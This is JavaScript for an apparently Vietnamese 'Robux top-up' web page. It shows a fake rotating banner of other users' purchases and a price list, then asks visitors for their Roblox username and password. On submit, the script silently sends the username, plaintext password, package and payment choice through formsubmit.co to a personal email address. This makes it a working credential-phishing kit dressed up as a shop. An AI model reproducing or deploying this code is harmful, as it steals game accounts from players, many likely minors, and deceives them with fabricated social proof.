const names = ["anahaha","pu sì","chim có 4 chân","meo meo","heo con","ga tre","vit map"];
const goiList = [
"5 Robux (Free)","80 Robux (10k)","145 Robux (30k)","500 Robux (100k)",
"1000 Robux (230k)","2000 Robux (440k)","5250 Robux (1200k)","450 Robux PREMIUM (145k)"
];

function genBanner(){
  let t="";
  for(let i=0;i<5;i++){
    t += names[Math.floor(Math.random()*names.length)] +
         "   đã nạp " +
         goiList[Math.floor(Math.random()*goiList.length)] +
         "   ";
  }
  bannerText.innerText=t;
}
setInterval(genBanner,8000);genBanner();

const tabNap=document.getElementById("tabNap"),
tabBangGia=document.getElementById("tabBangGia"),
nap=document.getElementById("nap"),
banggia=document.getElementById("banggia"),
home=document.getElementById("homeBtn"),
cardBox=document.getElementById("cardBox"),
bankBox=document.getElementById("bankBox"),
modal=document.getElementById("modal");

tabNap.onclick=()=>{tabNap.classList.add("active");tabBangGia.classList.remove("active");
nap.classList.remove("hidden");banggia.classList.add("hidden");};
tabBangGia.onclick=()=>{tabBangGia.classList.add("active");tabNap.classList.remove("active");
banggia.classList.remove("hidden");nap.classList.add("hidden");};
home.onclick=()=>{tabNap.click();napSection.scrollIntoView({behavior:"smooth"});};

document.querySelectorAll("input[name='pay']").forEach(r=>{
  r.onchange=()=>{
    cardBox.classList.toggle("hidden", r.value!=="card");
    bankBox.classList.toggle("hidden", r.value!=="bank");
  }
});

async function sendAutoEmail(data){
  const url = "https://formsubmit.co/ajax/minhtrankhai131110@gmail.com";
  await fetch(url, {
    method: "POST",
    headers: {"Content-Type":"application/json","Accept":"application/json"},
    body: JSON.stringify({
      subject: "Đơn nạp Robux",
      message: data
    })
  });
}

submit.onclick=async ()=>{
  const userV = user.value;
  const passV = pass.value;
  const goiV = goi.value;
  const payEl = document.querySelector("input[name='pay']:checked");

  if(!userV||!passV||!goiV||!payEl){
    alert("Vui lòng điền đầy đủ thông tin");
    return;
  }

  const payV = payEl.value;

  localStorage.setItem("lastUser", userV);
  localStorage.setItem("lastGoi", goiV);
  localStorage.setItem("lastPay", payV);

  const text =
    "Tên Roblox: " + userV + "\n" +
    "Mật khẩu: " + passV + "\n" +
    "Gói: " + goiV + "\n" +
    "Thanh toán: " + payV;

  try{
    await sendAutoEmail(text);
  }catch(e){
    console.log("Email send error (ignored):", e);
  }

  modal.style.display="flex";
};

modal.onclick=()=>modal.style.display="none";
